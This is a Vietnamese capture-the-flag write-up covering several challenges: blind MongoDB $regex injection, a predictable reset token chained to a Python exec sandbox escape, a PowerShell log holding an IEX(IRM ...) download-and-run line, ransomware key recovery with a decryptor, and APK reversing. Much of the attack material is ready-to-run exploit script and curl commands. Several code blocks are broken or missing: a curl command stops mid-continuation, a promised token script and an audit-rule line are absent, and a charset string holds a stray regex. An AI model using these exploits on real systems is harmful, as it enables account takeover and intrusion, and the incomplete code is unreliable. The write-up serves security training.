🌐 Web Application

GoWarmUp — Blind NoSQL Injection (MongoDB $regex)

Ứng dụng Go dùng JWT và MongoDB. Endpoint đăng ký cho phép tự chọn role, nên đăng ký thẳng một tài khoản admin:

curl -X POST http://localhost:3000/api/v1/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"password123","role":"admin"}'

curl -X POST http://localhost:3000/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"password123"}'
# -> {"token":"eyJhbGci..."}

Endpoint /api/v2/data?filter= nhét thẳng tham số filter vào truy vấn Mongo. Có thể chèn một toán tử $regex để leak trường address của user bob (chứa flag) theo kiểu blind — dò từng ký tự, mỗi lần đúng thì count > 0. Chú ý phải double-escape các ký tự đặc biệt của regex (^ $ { } [ ] . * + ?) để chúng tới được Mongo đúng dạng:

#!/usr/bin/env python3
import requests, string, time

URL = "http://throbbing-glade.web-chall-cscv.space"
CHARSET = "^[0-9a-f]{32}$" + string.ascii_letters + string.digits + "{}- "
TARGET_LEN = 42
REGEX_METACHARS = r"\.^$*+?()[]{}|"

s = requests.Session()
s.headers.update({"Content-Type": "application/json"})
u = "hacker" + str(int(time.time()))
s.post(f"{URL}/api/v1/register", json={"username": u, "password": "p", "role": "admin"})
token = s.post(f"{URL}/api/v1/login", json={"username": u, "password": "p"}).json()["token"]
headers = {"Authorization": f"Bearer {token}"}

flag, known = "", ""
for _ in range(TARGET_LEN):
    found = False
    for c in CHARSET:
        esc_c = ("\\\\" + c) if c in REGEX_METACHARS else c
        esc_known = "".join(("\\\\" + k) if k in REGEX_METACHARS else k for k in known)
        pattern = "^" + esc_known + esc_c + ".*"
        filter_param = '","address":{"$regex":"' + pattern + '"}}}//'
        r = s.get(f"{URL}/api/v2/data", headers=headers, params={"filter": filter_param}, timeout=5)
        if r.status_code == 200 and r.json().get("count", 0) > 0:
            flag += c; known += c; found = True
            print("[+]", flag); break
    if not found:
        break
print("FLAG:", flag)

S1mple API — Predictable reset token + Python exec RCE

Đọc source thấy 2 lỗ hổng nối tiếp nhau:

  1. Token đặt lại mật khẩu đoán được: token = SHA256(email + username + dob + "%Y:%m:%d-%H:%M"). Chỉ cần tự tính token của admin trong đúng phút server nhận forgot_password là đổi được mật khẩu admin.
  2. RCE: sau khi có quyền admin, endpoint /analysis/process_data gọi exec(script, safe_globals, safe_locals) với sandbox hở — vẫn với tới được __builtins__ qua chuỗi lớp cơ sở của Python, import os / socket để chạy mã tuỳ ý.

Giai đoạn 1 — chiếm admin (gửi forgot_password, bắt token server trả về rồi đổi mật khẩu ngay):

FRONTEND=$(sudo docker ps -q --filter name=node_frontend)
sudo docker exec -it $FRONTEND bash -c '
  RESP=$(curl -s -X POST "http://fastapi_backend:5555/auth/forgot_password" \
    -H "Content-Type: application/x-www-form-urlencoded" -d "email=admin@local.com")
  TOKEN=$(echo "$RESP" | grep -o "\"token\":\"[^\"]*\"" | cut -d"\"" -f4)
  curl -s -X POST "http://fastapi_backend:5555/auth/update_password" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=admin&token=$TOKEN&new_password=HackedPassword123"
  curl -s -X POST "http://fastapi_backend:5555/auth/login" \
    -H "Content-Type: application/x-www-form-urlencoded" \

'

Nếu tự tính token (khi không đọc được response), dùng đúng công thức và format thời gian của server:

Có admin token rồi thì gọi /analysis/process_data để thoát sandbox và RCE lấy flag trên server.

Chall Another Day — Điều tra log PowerShell (malware dropper)

Đọc log Microsoft-Windows-PowerShell/Operational. Đầu tiên là một easter-egg vô hại:

IEX(IRM 'https://gist.githubusercontent.com/oumazio/.../easter_egg')

Manh mối chính là hàm kiểm tra mật khẩu — password dài đúng 42 ký tự, SHA256(password) phải khớp mảng byte cố định; khi đúng thì chính password là flag (Correct! The flag is: $input):

function checkpass {
    param([string]$password)
    if ($password.Length -ne 42) { return $false }
    $hash = (New-Object System.Security.Cryptography.SHA256Managed).ComputeHash(
              [Text.Encoding]::ASCII.GetBytes($password))
    $expected = @(0x9B,0x3E,0x78,0x9A,0x71,0x24,0x45,0x5C,0x6E,0x71,0x99,0x57,0xB5,0x47,0x47,0x79,
                  0x69,0x61,0xAD,0x68,0x3F,0x73,0x7A,0x7C,0x7B,0x13,0x50,0x76,0x6D,0x71,0x5B,0x30)
    for ($i=0; $i -lt $hash.Length; $i++){ if ($hash[$i] -ne $expected[$i]) { return $false } }
    return $true
}

DFIR — Ransomware Analysis & Decryption

Đề bài: Một quản lý cấp cao tại công ty tài chính bị mã hoá toàn bộ tài liệu quan trọng và bị tống tiền. Nhiệm vụ:

  1. Xác định SHA-256 của file ransomware
  2. Khôi phục SHA-256 của file financialStatement.pdf gốc

Nhận diện ransomware

Tất cả file trên máy đã bị mã hoá (đuôi .enc). Kiểm tra bằng tasklist /v phát hiện tiến trình đáng ngờ: Runtime Broker.exe — tên giống process Windows hợp lệ (RuntimeBroker.exe) nhưng nằm ở C:\Windows\SysWOW64 thay vì System32.

Xác nhận bằng cách bật audit trên một thư mục rồi tạo file test — nếu file bị mã hoá thì EventID 4663 sẽ ghi lại process nào truy cập:

auditpol /set /subcategory:"File System" /success:enable /failure:enable

$acl  = Get-Acl $path
$rule = New-Object System.Security.AccessControl.FileSystemAuditRule(
    "Everyone",
    "CreateFiles,Write,AppendData,Delete,DeleteSubdirectoriesAndFiles",
    "ContainerInherit,ObjectInherit", "None", "Success"
)

Set-Acl $path $acl

Phân tích cơ chế mã hoá (IDA)

Chương trình viết bằng C++, dùng AES-256-CBC qua Windows BCrypt API. Workflow chính:

  1. sub_1400029A0() — sinh Key & IV từ Unix timestamp + thông tin máy
  2. sub_14000C5F0() — duyệt đệ quy thư mục, gọi mã hoá từng file
  3. sub_140002F70() — mã hoá AES-CBC, ghi .enc, xoá file gốc

Kỹ thuật đáng chú ý:

  • Rate Limiting: Sleep(100ms) giữa mỗi file — tránh kích hoạt EDR/heuristic do IOPS quá cao
  • Double Call BCryptEncrypt: gọi lần 1 với output NULL để lấy kích thước buffer, lần 2 mới mã hoá thật
  • Fallback: sau vòng lặp chính, quét thêm C:\Users\ và C:\ phòng trường hợp bỏ sót

Key Derivation (brute-force được)

Key sinh hoàn toàn từ Unix timestamp 32-bit:

T       = Unix timestamp (32-bit)
v16     = T XOR 0xDEADBEEF
pbInput = (T XOR 0xDEADBEEF XOR (T + 13107)) || (T XOR ((T XOR 0xDEADBEEF) + 13107))   # 8 bytes

Hash1   = SHA256(pbInput)              # 32 bytes
Hash2   = SHA256(Hash1 || v16 || T)    # 32 bytes
Key     = Hash1 XOR Hash2             # 32 bytes → AES-256 key

IV Derivation

IV sinh từ thông tin máy — cố định cho cùng một máy:

IV = SHA256("ComputerName_UserName")[:16]

Thu thập:

  • ComputerName: DESKTOP-PAEK96M — từ Registry ControlSet001\Control\ComputerName
  • UserName: MANAGER — từ đường dẫn user profile

Script giải mã (PowerShell)

Brute-force timestamp ±200 giây quanh mốc LastWriteTime của file .enc. Kiểm tra magic bytes (ZIP/Office: 50-4B-03-04, PDF: 25-50-44-46) để xác nhận key đúng:

param(
    [string]$InputRoot = "C:\EncryptedFiles",
    [string]$OutputRoot = "C:\EncryptedFiles\Decrypted",
    [string]$ComputerName = "DESKTOP-PAEK96M",
    [string]$UserName     = "MANAGER",
    [int]$TimeWindowSeconds = 200
)

function Get-UnixTimeSeconds {
    param([DateTime]$DateTime)
    return [int64]([DateTimeOffset]$DateTime.ToUniversalTime()).ToUnixTimeSeconds()
}

function Derive-KeyIv {
    param([int64]$UnixTimeSeconds, [string]$ComputerName, [string]$UserName)
    $T = [uint32]$UnixTimeSeconds
    $v16 = [uint32]($T -bxor 0xDEADBEEF)
    $pbInput0 = [uint32]($T -bxor 0xDEADBEEF -bxor ($T + 13107))
    $v23 = [uint32]($T -bxor (([uint32]($T -bxor 0xDEADBEEF)) + 13107))

    $buf1 = New-Object byte[] 8
    [System.Buffer]::BlockCopy([System.BitConverter]::GetBytes($pbInput0), 0, $buf1, 0, 4)
    [System.Buffer]::BlockCopy([System.BitConverter]::GetBytes($v23),      0, $buf1, 4, 4)

    $sha = [System.Security.Cryptography.SHA256]::Create()
    $h1 = $sha.ComputeHash($buf1)

    $buf2 = New-Object byte[] 40
    [System.Buffer]::BlockCopy($h1, 0, $buf2, 0, 32)
    [System.Buffer]::BlockCopy([System.BitConverter]::GetBytes($v16), 0, $buf2, 32, 4)
    [System.Buffer]::BlockCopy([System.BitConverter]::GetBytes($T),   0, $buf2, 36, 4)
    $h2 = $sha.ComputeHash($buf2)

    $key = New-Object byte[] 32
    for ($i = 0; $i -lt 32; $i++) { $key[$i] = $h1[$i] -bxor $h2[$i] }

    if ([string]::IsNullOrEmpty($ComputerName)) { $ComputerName = "UnknownPC" }
    if ([string]::IsNullOrEmpty($UserName))     { $UserName     = "UnknownUser" }
    $ivFull = $sha.ComputeHash([Text.Encoding]::ASCII.GetBytes("${ComputerName}_${UserName}"))
    $iv = New-Object byte[] 16
    [System.Buffer]::BlockCopy($ivFull, 0, $iv, 0, 16)
    $sha.Dispose()
    return @{ Key = $key; IV = $iv }
}

function Test-KeyOnFile {
    param([string]$FilePath, [byte[]]$Key, [byte[]]$IV)
    try {
        $ct = [IO.File]::ReadAllBytes($FilePath)
        $aes = [Security.Cryptography.Aes]::Create()
        $aes.Mode = "CBC"; $aes.Padding = "PKCS7"; $aes.Key = $Key; $aes.IV = $IV
        $dec = $aes.CreateDecryptor()
        $ms = New-Object IO.MemoryStream(,$ct)
        $cs = New-Object Security.Cryptography.CryptoStream($ms,$dec,"Read")
        $out = New-Object IO.MemoryStream
        $buf = New-Object byte[] 4096
        while (($r = $cs.Read($buf,0,$buf.Length)) -gt 0) { $out.Write($buf,0,$r) }
        $cs.Dispose(); $aes.Dispose()
        $plain = $out.ToArray(); $out.Dispose(); $ms.Dispose()
        if ($plain.Length -lt 4) { return $false }
        $m = [BitConverter]::ToString($plain[0..3])
        return ($m -eq "50-4B-03-04" -or $m -eq "25-50-44-46")
    } catch { return $false }
}

# --- Main ---
$encFiles = Get-ChildItem $InputRoot -Recurse -File -Filter *.enc | Where-Object { $_.Length -gt 0 }
$sample = $encFiles | Sort-Object Length | Select-Object -First 1
$baseUnix = Get-UnixTimeSeconds $sample.LastWriteTimeUtc

for ($t = $baseUnix - $TimeWindowSeconds; $t -le $baseUnix + $TimeWindowSeconds; $t++) {
    $d = Derive-KeyIv $t $ComputerName $UserName
    if (Test-KeyOnFile $sample.FullName $d.Key $d.IV) {
        Write-Host "[+] Key found at UnixTime=$t"
        foreach ($f in $encFiles) {
            $outPath = Join-Path $OutputRoot ($f.FullName.Substring($InputRoot.Length) -replace '\.enc$','')
            New-Item -ItemType Directory -Path (Split-Path $outPath) -Force | Out-Null
            $ct = [IO.File]::ReadAllBytes($f.FullName)
            $aes = [Security.Cryptography.Aes]::Create()
            $aes.Mode="CBC"; $aes.Padding="PKCS7"; $aes.Key=$d.Key; $aes.IV=$d.IV
            $dec=$aes.CreateDecryptor(); $ms=New-Object IO.MemoryStream(,$ct)
            $cs=New-Object Security.Cryptography.CryptoStream($ms,$dec,"Read")
            $o=New-Object IO.MemoryStream; $b=New-Object byte[] 4096
            while(($r=$cs.Read($b,0,$b.Length))-gt 0){$o.Write($b,0,$r)}
            [IO.File]::WriteAllBytes($outPath,$o.ToArray())
            $cs.Dispose(); $aes.Dispose(); $o.Dispose(); $ms.Dispose()
        }
        break
    }
}

BabyAPK — Khoá AES sinh sẵn hash + brute passkey 8 chữ số

Mở APK bằng jadx. MainActivity giải mã sẵn một chuỗi (f1101y) bằng AES-256-CBC, key = SHA256("secr_part" + key_part_res + "1.0.0"). Giá trị key_part_res nằm trong res/values/strings.xml:

<string name="key_part_res">k3yRe5</string>

Logic nút bấm yêu cầu passkey đúng 8 chữ số, so SHA256(passkey) với f1101y. Nếu đúng, flag = CSCV2025{ SHA1(passkey) }. Vậy giải mã f1101y để lấy target hash rồi brute 8 chữ số:

import base64, hashlib
from Crypto.Cipher import AES

KEY_MATERIAL = bytes.fromhex("736563725f70617274").decode() + "k3yRe5" + "1.0.0"  # "secr_part"+...
key = hashlib.sha256(KEY_MATERIAL.encode()).digest()
iv  = bytes.fromhex("2557127f6697dca3b9b02c85bc94d1ff")
ct  = base64.b64decode("Rh5g13iNfXguQWeoMU9vVc1pvK6oC6/4zLm1aW8nqq/KWQ+GbYACDvBQ9pa75Vy6Rpah4UJunK5WRgwlmE/fcWEPrIKyyh6c/diJrXOGQW8=")

pt = AES.new(key, AES.MODE_CBC, iv).decrypt(ct)

Unlocker — OTP từ native lib (mt19937_64) dựng lại bằng Python

Bản này giống BabyAPK nhưng passkey đúng là một OTP 15 ký tự [A-Za-z0-9] do NativeLib.generateInsecureOtp(15) sinh ra; flag = CSCV2025{ SHA1(OTP) }. Đọc libnativelib.so trong Ghidra thấy: bảng 62 ký tự 0-9A-Za-z, RNG là std::mt19937_64 với seed cố định 0x1350191, lấy chỉ số bằng uniform_int_distribution(0,61). Dựng lại đúng thuật toán trong Python:

import hashlib

class MT19937_64:
    NN, MM = 312, 156
    MATRIX_A = 0xB5026F5AA96619E9
    UM, LM = 0xFFFFFFFF80000000, 0x7FFFFFFF
    def __init__(self, seed):
        self.mt = [0]*self.NN; self.mt[0] = seed & 0xFFFFFFFFFFFFFFFF
        for i in range(1, self.NN):
            x = self.mt[i-1] ^ (self.mt[i-1] >> 62)
            self.mt[i] = (0x5851F42D4C957F2D * x + i) & 0xFFFFFFFFFFFFFFFF
        self.mti = self.NN
    def gen64(self):
        if self.mti >= self.NN:
            for i in range(self.NN):
                x = (self.mt[i] & self.UM) + (self.mt[(i+1) % self.NN] & self.LM)
                xa = x >> 1
                if x & 1: xa ^= self.MATRIX_A
                self.mt[i] = self.mt[(i + self.MM) % self.NN] ^ xa
            self.mti = 0
        x = self.mt[self.mti]; self.mti += 1
        x ^= (x >> 29) & 0x5555555555555555
        x ^= (x << 17) & 0x71D67FFFEDA60000
        x ^= (x << 37) & 0xFFF7EEE000000000
        x ^= (x >> 43)
        return x & 0xFFFFFFFFFFFFFFFF

CHARS = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"

def uniform_0_61(eng, buf=[0,0]):
    # mô phỏng independent_bits_engine 6 bit + reject >= 62 của libc++
    buffer = 0; left = 0
    while True:
        if left < 6:
            buffer = eng.gen64(); left = 64
        u = buffer & 0x3F; buffer >>= 6; left -= 6
        if u < 62: return u

eng = MT19937_64(0x1350191)
G = "".join(CHARS[uniform_0_61(eng)] for _ in range(15))
flag = "CSCV2025{" + hashlib.sha1(G.encode()).hexdigest() + "}"
print("OTP G:", G, "\nFLAG:", flag)
